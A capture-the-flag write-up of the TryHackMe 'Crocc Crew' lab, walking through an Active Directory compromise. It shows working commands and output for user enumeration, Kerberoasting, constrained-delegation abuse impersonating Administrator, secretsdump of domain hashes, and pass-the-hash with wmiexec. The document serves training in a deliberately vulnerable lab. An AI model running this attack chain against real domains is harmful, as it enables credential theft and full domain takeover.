# Crocc Crew - Write Up / Walkthrough 

**Note: This write up details a penetration testing conducted in a virtual system hosted on tryhackme.com . This system was designed for training**

# Executive summary
***Crocc Crew*** is a virtual system hosted by the plataform TryHackMe. I've conducted a penetration testing with the goal of identifying vulnerabilities, attack vectors, exploiting vulnerabilities and gaining root access. Activies were conducted to simulate an attacker.

# Summary Results
Crocc Crew was a Insane machine to compromise. The machine focused on Active Directory enumeration, Kerberos authentication, and delegation attacks. The initial enumeration exposed several AD-related services, allowing the identification of valid domain users and the Visitor account. After obtaining access as Visitor, Kerberoasting was used to retrieve a service ticket for the password-reset account, whose password was successfully recovered. Further enumeration and BloodHound analysis revealed a Kerberos Constrained Delegation (KCD) configuration involving the password-reset account and the oakley service.

By abusing this delegation configuration, it was possible to impersonate the Administrator account through S4U2Self/S4U2Proxy, obtain the Administrator Kerberos ticket, and subsequently extract domain credentials with secretsdump.

Finally, the Administrator NTLM hash was used for Pass-the-Hash to obtain a shell on the Domain Controller, resulting in full administrative access and completion of the machine.

# Tools used:
```
nmap
nxc (NetExec)
rpcclient
rdesktop
impacket
ldapsearch
dirsearch (not metioned, because it revealed no results)
```

# Attack Narrative

Initial recon:

NMAP:

```
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-19 17:29 -0300
Nmap scan report for 10.67.163.61
Host is up (0.32s latency).
Not shown: 65520 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-19 20:29:51Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: COOCTUS.CORP, Site: Default-First-Site-Name)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-19T20:31:22+00:00; +7s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: COOCTUS
|   NetBIOS_Domain_Name: COOCTUS
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: COOCTUS.CORP
|   DNS_Computer_Name: DC.COOCTUS.CORP
|   Product_Version: 10.0.17763
|_  System_Time: 2026-09-19T20:30:43+00:00
| ssl-cert: Subject: commonName=DC.COOCTUS.CORP
| Not valid before: 2026-09-18T20:26:06
|_Not valid after:  2027-03-20T20:26:06
49669/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6s, deviation: 0s, median: 6s
| smb2-time: 
|   date: 2026-09-19T20:30:43
|_  start_date: N/A
```
# Web

Let’s verify the website.

Going to robots.txt we can see two weird directories:

/backdoor.php

/db-config.bak

The db-config has an interesting code inside of it.
```
<?php

$servername = "db.cooctus.corp";
$username = "C00ctusAdm1n";
$password = "B4dt0th3b0n3";

// Create connection $conn = new mysqli($servername, $username, $password);

// Check connection if ($conn->connect_error) {
die ("Connection Failed: " .$conn->connect_error);
}

echo "Connected Successfully";

?>
```
Testing on SMB and adding the servername in our /etc/hosts, we get no successful attempts. (yeah, i know it was the server name and i didn’t know the IP, but i’ve tried!)

# SMB/LDAP

No relevant results


# Active Directory

Let’s enumerate the users in the AD (Active Directory)!

These usernames in the main page of the web server are grabbing my attention, I’ll save them and see if it’s something:

SP00KY 
CAKE 
MILES 
CRYILLIC 
VARG 
HORSHARK 
DARKSTAR7471 
ORIEL 
NAMELESS0NE 
SMACKHACK 
FAWAZ

Using kerbrute we got a list of some users:

kerbrute userenum -d COOCTUS.CORP --dc <IP> users.txt
```
Administrator
Guest
krbtgt
Visitor
mark
Jeff
Spooks
Steve
Howard
admCroccCrew
Fawaz
karen
cryillic
yumeko
pars
kevin
jon
Varg
evan
Ben
David
```
Let’s try to do AES-REP Roasting using impacket:
impacket-GetNPUsers COOCTUS.CORP/ -usersfile users.txt -format hashcat -outputfile hashes.txt -dc-ip <IP>
 
No successful result (DAMN!)

# RPC

Let’s check the RPCs:

rpcclient -U '' -N <ip> 

enumprivs

Interesting results came out and they're: "SeEnableDelegationPrivilege" and "SeDelegateSessionUserImpersonatePrivilege" 

Let's see another vector to attack.

# RDP 

Let’s verify the RDP port! (ms-wbt-server Microsoft Terminal Services)

Got a anonymous login in RDP!

``rdestkop -f -u “” <ip>``

Inside of the rdesktop, it reveals a username and password for our first user

With that in hand, we successfully are logged in the AD environment. Now, let’s see what user is that attached to a service and get his hash

``impacket-GetUserSPNs COOCTUS.CORP/Visitor:'GuestLogin!' -dc-ip 10.67.139.131 -request``
```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name            MemberOf  PasswordLastSet             LastLogon                   Delegation  
--------------------  --------------  --------  --------------------------  --------------------------  -----------
HTTP/dc.cooctus.corp  password-reset            2021-06-08 19:00:39.356663  2021-06-08 18:46:23.369540  constrained 



[-] CCache file is not found. Skipping...
$krb5tgs$23$*password-reset$COOCTUS.CORP$COOCTUS.CORP/password-reset*$634670b17ee1d4f8f92c8d459962dcf4$0cbb0686631b0154cdbd45feac642a2c1dc31dd7d7e4919ba8597dddd53ab61553034bcc1e69184fec066d9163fc0a1200cfdd45d380de010e8ced6960c1f72556332527b2bae9aa91548ca70f848b0d7ec47ce402511a735915ceecee2cb2bc837f53b7c193cae79f1e617f91491cc4ed64142bbf47090b7be5e1fa8325779c715b591abbda631e222c95977c654a56bf9be53747ea185ebf4ab0e82f5a512891b55cebbe0b960e59711e458408dd9fa3ab1a6f866bb872c44aaf0a3b76b5cf02c83cb9db085aff7d4a24ba1a1461c4a5c3d1cfb467aeaf48bd22a93fae6b5ef5f23aec7c7f0b2da22df2bbe6f1019c02fcd7cf89186c16a08f3ce023a46c94ed73f3d682d814f03a7899c353f92b231aecb439830be4ec360174fe5cdb6a60f07fc3fa7bc17469dda918e477b8b7211e3e3d1bfdd52e46bd9f9a7da73a5ad146a0773d89d4e44242c3f175a6ff0043a8df6a44d59ded38eb6d28e013c74dfa75a148451dcd331b774a31adb14aa5a697c4f996ad58178d92e43dfa97c48eb2b4e781668409f0ec91e0875654d36616a7f3ee6a3528e909f6219bea02d2d61bd79f399c951d77a30961d1551d1e6319d3afc39bf75ff2bc7a6296d0af1902d6d11a1a98371c09759316c6255e0f9a7a1dd498df536a301606edc19f260fce8342ab7950aca6911421dc0bfbd09692329a48600fe8755e4d4e814082e67474cfdaa406a99652c022bac887aa41b13e110329f24a12250b141f03a43ad157088250520d81905bbde6588139597ed6e075317041c1f8ce52a317caf599ca14c08ea6f043fe36b63d9a0e02ef1ac481f626c1c218f98e870939fb28318b83ff8325062a1e8b353b868cf795054843f5962885fb0d011781189f512cbc5e0a2779b8639b8d5ce6aa3cec5e918970600f347a827bcdf994d34bf9823b4f7500954ea1fac783dcf7de1670c6355b24bdfcfc6fa06a93ec789418a2f5559afd2bf558d4f9f8eda37d8b82acb0d0575bbb41740ab2d65fb8ed1c9d2c9be9df51eb5acf78e3371e6450e7dfd5f5d7dfad30cf091231272d6fb79cd74ebd9d0834bf9fe61dd5e128e173ff184b2f16b204861343c0582f5bbd21d49a4a12848b689ccf3778b31d10f0d20d97e64c49f422484c88ddffe66eb78a79437ecb6c2f4c551adbc7ebd16352f0bf69c4c511226b5bb7bf8c8dee944c34c9d904c882cfd85595492de765a07268d079eda8da39a4e332ae0781d90c7f9e0406f1e9f2e9f091ed94f07b8dcc3e2d7c66b3d5972bc12c5c27c33d01609122dad2c9ad0d32050fe72310089ea7ffaaed7911cafe72b7d47ddf2c73c3c84133c0e18fd7727c35:resetpassword
````

we got his password and hash!

# Bloodhound

let’s view our permission in blood hound

(image later)

As we can see, we have permission “AllowedToDelegate”, which means that we can impersonate a service. By doing that, we would be able to extract hashes, let’s see what service we can impersonate.

``impacket-findDelegation cooctus.corp/'password-reset':'resetpassword' -dc-ip DC.COOCTUS.CORP``

We can impersonate the service ‘oakley’

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

AccountName     AccountType  DelegationType                      DelegationRightsTo                   SPN Exists 
--------------  -----------  ----------------------------------  -----------------------------------  ----------
DC$             Computer     Unconstrained                       N/A                                  Yes        
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS.CORP  No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP               No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC                            No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC.COOCTUS.CORP/COOCTUS       No         
password-reset  Person       Constrained w/ Protocol Transition  oakley/DC/COOCTUS                    No        
````

With this information, let’s impersonate the service ‘oakley’ as ‘password-reset’ user. This will cause to store the informations and hash of the user Administrator:

``impacket-getST -dc-ip DC.COOCTUS.CORP -spn 'oakley/DC.COOCTUS.CORP' cooctus.corp/'password-reset':'resetpassword' -impersonate Administrator``


```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache
```
Let’s rename the file, so we can export to KRB5CCNAME. This exportation will make us able to use the flag ‘-k’ in impacket, so we can use the gathered information.
```
mv Administrator@oakley_DC.COOCTUS.CORP@COOCTUS.CORP.ccache admin.ccache
                                                                                                                                                                                                                                           
KRB5CCNAME=admin.ccache
```

Now, let’s gather all hashes in this domain, for that, we’ll be using impacket-secretsdump

``impacket-secretsdump -k -no-pass DC.COOCTUS.CORP``

```
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xe748a0def7614d3306bd536cdc51bebe
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:7dfa0531d73101ca080c7379a9bff1c7:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
COOCTUS\DC$:plain_password_hex:f567a8209dd6c6f120e6084af725bd1b724b847f6c0de8a45c3623989831b62cf3e70d53515930d8ca54d8d2f754e09371fb6b2c66990fe3f899aec564eb8c4fc9312c0105e0045ade1d54e48b168ac01ba1644546b055427cb7bc67a0756917b77d3f0949f1cad60752e12ba678a74a703b4967ce641beff58f593b474899e99f9803721c950af75c28d1be5dc31d9650f3234f9f37ae2bf273cd4e0b33d62e953ff45886ecb09eff62c85ff53d99451206948ec968b81ddb55058f0e8ce67875b2384a9aae3d1dc237eca32ce63c4848548c19741cf26a2ff4981f6c2617daac8317e11975c86a603e3b01c4a8b5df
COOCTUS\DC$:aad3b435b51404eeaad3b435b51404ee:841e450cc99e9a090a4f7eb1db1befc6:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xdadf91990ade51602422e8283bad7a4771ca859b
dpapi_userkey:0x95ca7d2a7ae7ce38f20f1b11c22a05e5e23b321b
[*] NL$KM 
 0000   D5 05 74 5F A7 08 35 EA  EC 25 41 2C 20 DC 36 0C   ..t_..5..%A, .6.
 0010   AC CE CB 12 8C 13 AC 43  58 9C F7 5C 88 E4 7A C3   .......CX..\..z.
 0020   98 F2 BB EC 5F CB 14 63  1D 43 8C 81 11 1E 51 EC   ...._..c.C....Q.
 0030   66 07 6D FB 19 C4 2C 0E  9A 07 30 2A 90 27 2C 6B   f.m...,...0*.',k
NL$KM:d505745fa70835eaec25412c20dc360caccecb128c13ac43589cf75c88e47ac398f2bbec5fcb14631d438c81111e51ec66076dfb19c42c0e9a07302a90272c6b
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:d4609747ddec61b924977ab42538797e:::
COOCTUS.CORP\Visitor:1109:aad3b435b51404eeaad3b435b51404ee:872a35060824b0e61912cb2e9e97bbb1:::
COOCTUS.CORP\mark:1115:aad3b435b51404eeaad3b435b51404ee:0b5e04d90dcab62cc0658120848244ef:::
COOCTUS.CORP\Jeff:1116:aad3b435b51404eeaad3b435b51404ee:1004ed2b099a7c8eaecb42b3d73cc9b7:::
COOCTUS.CORP\Spooks:1117:aad3b435b51404eeaad3b435b51404ee:07148bf4dacd80f63ef09a0af64fbaf9:::
COOCTUS.CORP\Steve:1119:aad3b435b51404eeaad3b435b51404ee:2ae85453d7d606ec715ef2552e16e9b0:::
COOCTUS.CORP\Howard:1120:aad3b435b51404eeaad3b435b51404ee:65340e6e2e459eea55ae539f0ec9def4:::
COOCTUS.CORP\admCroccCrew:1121:aad3b435b51404eeaad3b435b51404ee:0e2522b2d7b9fd08190a7f4ece342d8a:::
COOCTUS.CORP\Fawaz:1122:aad3b435b51404eeaad3b435b51404ee:d342c532bc9e11fc975a1e7fbc31ed8c:::
COOCTUS.CORP\karen:1123:aad3b435b51404eeaad3b435b51404ee:e5810f3c99ae2abb2232ed8458a61309:::
COOCTUS.CORP\cryillic:1124:aad3b435b51404eeaad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf:::
COOCTUS.CORP\yumeko:1125:aad3b435b51404eeaad3b435b51404ee:c0e0e39ac7cab8c57c3543c04c340b49:::
COOCTUS.CORP\pars:1126:aad3b435b51404eeaad3b435b51404ee:fad642fb63dcc57a24c71bdc47e55a05:::
COOCTUS.CORP\kevin:1127:aad3b435b51404eeaad3b435b51404ee:48de70d96bf7b6874…
```
We got a lot of hashes!

Now, let’s use a technique called ‘Pass-The-Hash’, this technique will make us login as the ‘Administrator’ without the use of password.

Using the hash gathered in:
```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:add41095f1fb0405b32f70a489de022d:::
```
(we’ll be only using the last part of the hash, beginning with ‘add41..’)

We must be able to access the machine of the administrator and get a shell:


impacket-wmiexec 'cooctus.corp/Administrator@DC.COOCTUS.CORP' -hashes ':add41095f1fb0405b32f70a489de022d'

We obtained a shell as Administrator, gaining full administrative access to the domain controller. 

Now just search for the flags! Because I was stuck with finding flags too.. the flags are located in:
/Perflogs/Admin
/Share/Home

# Personal Note

Looking back at this machine, the write-up may make the whole process look much easier and faster than it actually was. I had some difficulty finding the first valid user, Visitor, mainly because I had forgotten to include some important enumeration techniques in my personal cheatsheet

After getting access as Visitor, the process became much faster. Everyone has their own methodology when approaching a machine, and in this case, my intuition helped me identify the path toward the password-reset account relatively quickly, without spending too much time checking other possibilities first

After obtaining access to password-reset, I decided to perform some additional enumeration instead of immediately assuming that I had found the intended path. It did not reveal much useful information, so I moved on to BloodHound, which made the relationships and possible attack paths much easier to understand

My main bottleneck throughout the machine was actually remembering some of the commands I needed (lol)

Overall, this machine was a good reminder that methodology is not always linear. Sometimes intuition leads you directly to something useful, while other times you need to slow down, enumerate more, and map the environment before continuing

And also... this room teached me a lot!
